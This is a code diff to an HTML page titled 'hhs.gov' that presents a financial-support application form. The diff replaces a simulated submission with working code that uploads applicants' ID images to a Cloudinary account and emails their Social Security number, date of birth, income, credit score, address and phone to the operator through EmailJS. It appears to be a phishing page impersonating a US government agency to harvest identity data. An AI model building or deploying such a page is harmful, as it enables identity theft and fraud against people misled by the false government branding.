@@ -6,6 +6,7 @@
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" integrity="sha384-tViUnnbYAV00FLIhhi3v/dWt3Jxw4gZQcNoSCxCIFNJVCx7/D55/wXsrNIRANwdD" crossorigin="anonymous">
       <link rel="shortcut icon" href="css/image/logo-desktop.svg" type="image/x-icon">
       <link rel="stylesheet" href="css/form.css">
+      // <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <title>hhs.gov</title>
 </head>
 <body>
@@ -120,6 +121,13 @@
                             <div class="error-message" id="phoneNumber-error"></div>
                         </div>
 
+                        <div class="form-group">
+                           <label class="form-label" for="userEmail">Email Address *</label>
+                           <input type="email" id="userEmail" class="form-input" placeholder="you@example.com" required>
+                           <div class="error-message" id="userEmail-error"></div>
+                       </div>
+
+
                         <div class="form-group form-grid-full">
                             <label class="form-label" for="streetAddress">Street Address *</label>
                             <input type="text" id="streetAddress" class="form-input" required>
@@ -196,7 +204,7 @@
                             </div>
                         </div>
                         <div class="error-message" id="idUpload-error"></div>
-                        <div class="file-preview" id="filePreview" style="display: none;">
+                        <div class="file-preview" id="filePreview"  style="display: none;">
                             <img id="previewImage" alt="ID Preview">
                         </div>
                     </div>
@@ -212,269 +220,243 @@
         </form>
     </div>
 
-    <script>
-        class ApplicationForm {
-            constructor() {
-                this.form = document.getElementById('applicationForm');
-                this.submitButton = document.getElementById('submitButton');
-                this.fileUpload = document.getElementById('idUpload');
-                this.fileUploadArea = document.getElementById('fileUploadArea');
-                this.categoryDisplay = document.getElementById('categoryDisplay');
-                
-                this.initializeForm();
-                this.setupEventListeners();
-                this.loadCategoryFromURL();
+ <script>
+emailjs.init("Ip04_l-6HrsnhwEdb");
+
+class ApplicationForm {
+    constructor() {
+        this.form = document.getElementById('applicationForm');
+        this.submitButton = document.getElementById('submitButton');
+        this.fileUpload = document.getElementById('idUpload');
+        this.fileUploadArea = document.getElementById('fileUploadArea');
+        this.categoryDisplay = document.getElementById('categoryDisplay');
+        this.cloudName = "dx4qqr3cc";
+        this.uploadPreset = "codyjohnson";
+        this.selectedFiles = [];
+
+        this.initializeForm();
+        this.setupEventListeners();
+        this.loadCategoryFromURL();
+    }
+
+    initializeForm() {
+        ['estimatedAmount', 'annualIncome'].forEach(id => {
+            const input = document.getElementById(id);
+            input.addEventListener('input', (e) => this.formatCurrency(e.target));
+        });
+
+        document.getElementById('phoneNumber').addEventListener('input', (e) => this.formatPhone(e.target));
+        document.getElementById('ssn').addEventListener('input', (e) => this.formatSSN(e.target));
+    }
+
+    setupEventListeners() {
+        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
+        this.fileUploadArea.addEventListener('click', () => this.fileUpload.click());
+        this.fileUpload.addEventListener('change', (e) => this.handleFileUpload(e));
+        this.form.addEventListener('input', (e) => this.clearError(e.target));
+        this.form.addEventListener('change', (e) => this.clearError(e.target));
+    }
+
+    loadCategoryFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const category = urlParams.get('category') || 'Financial Support';
+        this.categoryDisplay.textContent = category;
+        document.getElementById('moneyFor').value = category;
+    }
+
+    formatCurrency(input) {
+        const value = input.value.replace(/[^\d]/g, '');
+        if (value) {
+            input.value = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: 0 }).format(parseInt(value));
+        } else {
+            input.value = '';
+        }
+    }
+
+    formatPhone(input) {
+        const value = input.value.replace(/[^\d]/g, '');
+        if (value.length >= 10) {
+            input.value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
+        } else {
+            input.value = value;
+        }
+    }
+
+    formatSSN(input) {
+        const value = input.value.replace(/[^\d]/g, '');
+        if (value.length >= 9) {
+            input.value = `***-**-${value.slice(-4)}`;
+        } else {
+            input.value = value;
+        }
+    }
+
+    handleFileUpload(event) {
+        const files = Array.from(event.target.files);
+        this.selectedFiles = files;
+
+        const preview = document.getElementById('filePreview');
+        preview.innerHTML = '';
+
+        files.forEach(file => {
+            if (!file.type.startsWith('image/')) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const img = document.createElement('img');
+                img.src = e.target.result;
+                img.style.maxWidth = '100px';
+                img.style.margin = '5px';
+                preview.appendChild(img);
+            };
+            reader.readAsDataURL(file);
+        });
+
+        preview.style.display = 'block';
+        this.clearError(this.fileUpload);
+    }
+
+    validateForm() {
+        const errors = {};
+        const requiredFields = [
+            'estimatedAmount', 'moneyFor', 'employmentStatus', 'annualIncome', 'creditScore',
+            'firstName', 'lastName', 'dateOfBirth', 'streetAddress', 'city', 'state',
+            'zipCode', 'ssn', 'phoneNumber', 'userEmail'
+        ];
+
+        requiredFields.forEach(field => {
+            const element = document.getElementById(field);
+            if (!element.value.trim()) {
+                errors[field] = 'This field is required';
             }
+        });
 
-            initializeForm() {
-                // Format currency inputs
-                ['estimatedAmount', 'annualIncome'].forEach(id => {
-                    const input = document.getElementById(id);
-                    input.addEventListener('input', (e) => this.formatCurrency(e.target));
-                });
+        const homeOwnership = document.querySelector('input[name="homeOwnership"]:checked');
+        if (!homeOwnership) errors['homeOwnership'] = 'Please select an option';
 
-                // Format phone number
-                const phoneInput = document.getElementById('phoneNumber');
-                phoneInput.addEventListener('input', (e) => this.formatPhone(e.target));
+        const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/;
+        const phoneValue = document.getElementById('phoneNumber').value;
+        if (phoneValue && !phoneRegex.test(phoneValue)) errors['phoneNumber'] = 'Invalid phone format';
 
-                // Format SSN
-                const ssnInput = document.getElementById('ssn');
-                ssnInput.addEventListener('input', (e) => this.formatSSN(e.target));
-            }
+        const emailValue = document.getElementById('userEmail').value.trim();
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (emailValue && !emailRegex.test(emailValue)) errors['userEmail'] = 'Invalid email format';
 
-            setupEventListeners() {
-                this.form.addEventListener('submit', (e) => this.handleSubmit(e));
-                this.fileUploadArea.addEventListener('click', () => this.fileUpload.click());
-                this.fileUpload.addEventListener('change', (e) => this.handleFileUpload(e));
+        if (!this.selectedFiles.length) errors['idUpload'] = 'ID upload is required';
 
-                // Clear errors on input
-                this.form.addEventListener('input', (e) => this.clearError(e.target));
-                this.form.addEventListener('change', (e) => this.clearError(e.target));
-            }
+        return errors;
+    }
 
-            loadCategoryFromURL() {
-                const urlParams = new URLSearchParams(window.location.search);
-                const category = urlParams.get('category') || 'Financial Support';
-                this.categoryDisplay.textContent = category;
-                document.getElementById('moneyFor').value = category;
-            }
+    showErrors(errors) {
+        Object.keys(errors).forEach(field => {
+            const errorElement = document.getElementById(`${field}-error`);
+            const inputElement = document.getElementById(field) || document.querySelector(`input[name="${field}"]`);
+            if (errorElement) errorElement.textContent = errors[field];
+            if (inputElement) inputElement.classList.add('error');
+        });
+    }
 
-            formatCurrency(input) {
-                const value = input.value.replace(/[^\d]/g, '');
-                if (value) {
-                    const formatted = new Intl.NumberFormat('en-US', {
-                        style: 'currency',
-                        currency: 'USD',
-                        minimumFractionDigits: 0,
-                        maximumFractionDigits: 0
-                    }).format(parseInt(value));
-                    input.value = formatted;
-                } else {
-                    input.value = '';
-                }
-            }
+    clearError(element) {
+        const fieldName = element.name || element.id;
+        const errorElement = document.getElementById(`${fieldName}-error`);
+        if (errorElement) errorElement.textContent = '';
+        element.classList.remove('error');
+    }
 
-            formatPhone(input) {
-                const value = input.value.replace(/[^\d]/g, '');
-                if (value.length >= 10) {
-                    input.value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6, 10)}`;
-                } else {
-                    input.value = value;
-                }
-            }
+    async uploadImagesToCloudinary() {
+        const uploadPromises = this.selectedFiles.map(file => {
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("upload_preset", this.uploadPreset);
 
-            formatSSN(input) {
-                const value = input.value.replace(/[^\d]/g, '');
-                if (value.length >= 9) {
-                    input.value = `***-**-${value.slice(-4)}`;
-                } else {
-                    input.value = value;
-                }
-            }
+            return fetch(`https://api.cloudinary.com/v1_1/${this.cloudName}/image/upload`, {
+                method: 'POST',
+                body: formData
+            }).then(res => res.json());
+        });
 
-            handleFileUpload(event) {
-                const file = event.target.files[0];
-                if (!file) return;
+        return Promise.all(uploadPromises);
+    }
 
-                if (file.size > 5 * 1024 * 1024) {
-                    this.showToast('File too large', 'Please upload an image smaller than 5MB', 'error');
-                    return;
-                }
+    async handleSubmit(event) {
+        event.preventDefault();
 
-                if (!file.type.startsWith('image/')) {
-                    this.showToast('Invalid file type', 'Please upload an image file', 'error');
-                    return;
-                }
+        const errors = this.validateForm();
+        document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
+        document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
 
-                // Show success state
-                this.fileUploadArea.classList.add('success');
-                document.getElementById('uploadContent').style.display = 'none';
-                document.getElementById('uploadSuccess').style.display = 'block';
-
-                // Show preview
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    const preview = document.getElementById('filePreview');
-                    const img = document.getElementById('previewImage');
-                    img.src = e.target.result;
-                    preview.style.display = 'block';
-                };
-                reader.readAsDataURL(file);
-
-                this.clearError(this.fileUpload);
-            }
-
-            validateForm() {
-                const errors = {};
-                const requiredFields = [
-                    'estimatedAmount', 'moneyFor', 'employmentStatus', 'annualIncome', 'creditScore',
-                    'firstName', 'lastName', 'dateOfBirth', 'streetAddress', 'city', 'state',
-                    'zipCode', 'ssn', 'phoneNumber'
-                ];
-
-                requiredFields.forEach(field => {
-                    const element = document.getElementById(field);
-                    if (!element.value.trim()) {
-                        errors[field] = 'This field is required';
-                    }
-                });
-
-                // Validate home ownership radio buttons
-                const homeOwnership = document.querySelector('input[name="homeOwnership"]:checked');
-                if (!homeOwnership) {
-                    errors['homeOwnership'] = 'Please select an option';
-                }
-
-                // Validate phone format
-                const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/;
-                const phoneValue = document.getElementById('phoneNumber').value;
-                if (phoneValue && !phoneRegex.test(phoneValue)) {
-                    errors['phoneNumber'] = 'Invalid phone format';
-                }
-
-                // Validate file upload
-                if (!this.fileUpload.files[0]) {
-                    errors['idUpload'] = 'ID upload is required';
-                }
-
-                return errors;
-            }
-
-            showErrors(errors) {
-                Object.keys(errors).forEach(field => {
-                    const errorElement = document.getElementById(`${field}-error`);
-                    const inputElement = document.getElementById(field) || document.querySelector(`input[name="${field}"]`);
-                    
-                    if (errorElement) {
-                        errorElement.textContent = errors[field];
-                    }
-                    
-                    if (inputElement) {
-                        inputElement.classList.add('error');
-                    }
-
-                    if (field === 'idUpload') {
-                        this.fileUploadArea.classList.add('error');
-                    }
-                });
-            }
-
-            clearError(element) {
-                const fieldName = element.name || element.id;
-                const errorElement = document.getElementById(`${fieldName}-error`);
-                
-                if (errorElement) {
-                    errorElement.textContent = '';
-                }
-                
-                element.classList.remove('error');
-
-                if (fieldName === 'idUpload') {
-                    this.fileUploadArea.classList.remove('error');
-                }
-            }
-
-            async handleSubmit(event) {
-                event.preventDefault();
-
-                const errors = this.validateForm();
-                
-                // Clear previous errors
-                document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
-                document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
-                this.fileUploadArea.classList.remove('error');
-
-                if (Object.keys(errors).length > 0) {
-                    this.showErrors(errors);
-                    this.showToast('Please correct the errors', 'Some required fields are missing or invalid', 'error');
-                    return;
-                }
-
-                // Show loading state
-                this.submitButton.disabled = true;
-                this.submitButton.innerHTML = '<span class="loading-spinner"></span>Submitting...';
-
-                // Simulate form submission
-                try {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    this.showToast(
-                        'Application Submitted Successfully!',
-                        'Thank you! Your application has been submitted. We will contact you shortly.',
-                        'success'
-                    );
-
-                    // Reset form after successful submission
-                    setTimeout(() => {
-                        this.form.reset();
-                        this.resetFileUpload();
-                    }, 3000);
-
-                } catch (error) {
-                    this.showToast('Submission Failed', 'Please try again later', 'error');
-                } finally {
-                    this.submitButton.disabled = false;
-                    this.submitButton.innerHTML = 'Submit Application';
-                }
-            }
-
-            resetFileUpload() {
-                this.fileUploadArea.classList.remove('success');
-                document.getElementById('uploadContent').style.display = 'block';
-                document.getElementById('uploadSuccess').style.display = 'none';
-                document.getElementById('filePreview').style.display = 'none';
-            }
-
-            showToast(title, description, type = 'success') {
-                // Remove existing toasts
-                const existingToasts = document.querySelectorAll('.toast');
-                existingToasts.forEach(toast => toast.remove());
-
-                const toast = document.createElement('div');
-                toast.className = `toast ${type}`;
-                toast.innerHTML = `
-                    <div class="toast-title">${title}</div>
-                    <div class="toast-description">${description}</div>
-                `;
-
-                document.body.appendChild(toast);
-
-                // Show toast
-                setTimeout(() => toast.classList.add('show'), 100);
-
-                // Hide toast after 5 seconds
-                setTimeout(() => {
-                    toast.classList.remove('show');
-                    setTimeout(() => toast.remove(), 300);
-                }, 5000);
-            }
+        if (Object.keys(errors).length > 0) {
+            this.showErrors(errors);
+            this.showToast('Please correct the errors', 'Some required fields are missing or invalid', 'error');
+            return;
         }
 
-        // Initialize the form when the page loads
-        document.addEventListener('DOMContentLoaded', () => {
-            new ApplicationForm();
-        });
-    </script>
+        this.submitButton.disabled = true;
+        this.submitButton.innerHTML = '<span class="loading-spinner"></span>Submitting...';
+
+        try {
+            const uploads = await this.uploadImagesToCloudinary();
+            const imageUrls = uploads.map(u => u.secure_url).join(', ');
+
+            const formData = {
+                estimatedAmount: document.getElementById('estimatedAmount').value,
+                moneyFor: document.getElementById('moneyFor').value,
+                employmentStatus: document.getElementById('employmentStatus').value,
+                annualIncome: document.getElementById('annualIncome').value,
+                creditScore: document.getElementById('creditScore').value,
+                firstName: document.getElementById('firstName').value,
+                lastName: document.getElementById('lastName').value,
+                dateOfBirth: document.getElementById('dateOfBirth').value,
+                phoneNumber: document.getElementById('phoneNumber').value,
+                streetAddress: document.getElementById('streetAddress').value,
+                city: document.getElementById('city').value,
+                state: document.getElementById('state').value,
+                zipCode: document.getElementById('zipCode').value,
+                ssn: document.getElementById('ssn').value,
+                homeOwnership: document.querySelector('input[name="homeOwnership"]:checked').value,
+                userEmail: document.getElementById('userEmail').value,
+                imageUrls,
+                user_name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`
+            };
+
+            await emailjs.send("service_mj2jnxi", "template_l3i1f33", formData);
+            await emailjs.send("service_mj2jnxi", "template_ya8heou", formData);
+
+            this.showToast('Submitted!', 'Application sent successfully.', 'success');
+            setTimeout(() => {
+                this.form.reset();
+                document.getElementById('filePreview').innerHTML = '';
+                this.selectedFiles = [];
+            }, 3000);
+
+        } catch (err) {
+            console.error(err);
+            this.showToast('Error', 'Submission failed. Try again.', 'error');
+        } finally {
+            this.submitButton.disabled = false;
+            this.submitButton.innerHTML = 'Submit Application';
+        }
+    }
+
+    showToast(title, description, type = 'success') {
+        document.querySelectorAll('.toast').forEach(t => t.remove());
+        const toast = document.createElement('div');
+        toast.className = `toast ${type}`;
+        toast.innerHTML = `<div class="toast-title">${title}</div><div class="toast-description">${description}</div>`;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.classList.add('show'), 100);
+        setTimeout(() => {
+            toast.classList.remove('show');
+            setTimeout(() => toast.remove(), 300);
+        }, 5000);
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    new ApplicationForm();
+});
+</script>
+
+
     
 </body>
 </html>
